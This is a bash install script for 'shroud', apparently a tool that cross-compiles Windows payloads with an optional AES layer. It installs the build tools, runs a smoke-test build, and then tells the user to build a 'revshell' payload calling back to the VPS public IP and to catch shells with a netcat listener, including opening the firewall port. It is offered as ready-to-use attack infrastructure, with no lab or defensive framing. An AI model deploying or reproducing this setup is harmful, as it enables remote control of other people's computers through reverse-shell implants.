#!/usr/bin/env bash
#
# setup-vps.sh — bootstrap shroud on a fresh Ubuntu/Debian VPS.
#
# Run as the user you want to own the install (it will sudo for apt):
#
#   # option A — clone from your GitHub repo (after you've pushed it):
#   REPO_URL=https://github.com/<you>/shroud.git bash setup-vps.sh
#
#   # option B — you've already scp'd the repo to the box:
#   bash setup-vps.sh        # expects ./shroud (or this file to be inside it)
#
#   # option C — pipe straight from your laptop over ssh:
#   ssh ubuntu@vps 'bash -s' < setup-vps.sh
#
# Then on the VPS:
#   ~/shroud/build.sh revshell --public 9000     # payload calls back to the VPS public IP
#   ~/shroud/listen.sh 9000                       # catch it (open the port in the firewall first)
#
set -euo pipefail

INSTALL_DIR="${INSTALL_DIR:-$HOME/shroud}"
REPO_URL="${REPO_URL:-}"

echo "[*] installing apt deps (mingw-w64, python, git, netcat, curl)..."
sudo apt-get update -qq
sudo apt-get install -y -qq mingw-w64 python3 python3-pip git netcat-openbsd curl

# ---- get the source ---------------------------------------------------------
if [ -d "$INSTALL_DIR" ] && [ -x "$INSTALL_DIR/shroud" ]; then
  echo "[*] using existing $INSTALL_DIR"
elif [ -n "$REPO_URL" ]; then
  echo "[*] cloning $REPO_URL -> $INSTALL_DIR"
  git clone --depth 1 "$REPO_URL" "$INSTALL_DIR"
elif [ -x "./shroud" ]; then
  INSTALL_DIR="$(pwd -P)"; echo "[*] running from $INSTALL_DIR"
else
  echo "[!] no shroud source found."
  echo "    set REPO_URL=https://github.com/<you>/shroud.git , or scp the repo here."
  exit 1
fi

cd "$INSTALL_DIR"

# ---- python deps (only pycryptodome, for -e aes) ----------------------------
echo "[*] python deps (pycryptodome for the AES layer)..."
if python3 -c "import Crypto" 2>/dev/null; then
  echo "    pycryptodome already present."
else
  pip3 install --user --quiet pycryptodome \
    || sudo pip3 install --quiet pycryptodome \
    || sudo apt-get install -y -qq python3-pycryptodome
  # make sure user pip bins are on PATH
  case ":$PATH:" in *":$HOME/.local/bin:"*) ;; *) export PATH="$HOME/.local/bin:$PATH";; esac
fi

# ---- authorize + smoke test -------------------------------------------------
echo "[*] authorizing + smoke test..."
chmod +x build.sh shroud 2>/dev/null || true
./shroud authorize < /dev/null >/dev/null 2>&1 || true
if ./build.sh calc >/dev/null 2>&1; then
  echo "[+] smoke test OK -> $INSTALL_DIR/dist/calc.exe"
else
  echo "[!] smoke test failed — check mingw-w64 / python output above."
  exit 1
fi

# ---- quick firewall reminder -----------------------------------------------
echo
echo "=============================================================="
echo " shroud installed at: $INSTALL_DIR"
echo
echo " build payloads:   cd $INSTALL_DIR && ./build.sh revshell --public 9000"
echo " catch shells:      cd $INSTALL_DIR && ./listen.sh 9000"
echo
echo " NOTE: open the listener port on your VPS firewall / provider"
echo "       security group, e.g.  sudo ufw allow 9000/tcp"
echo "=============================================================="
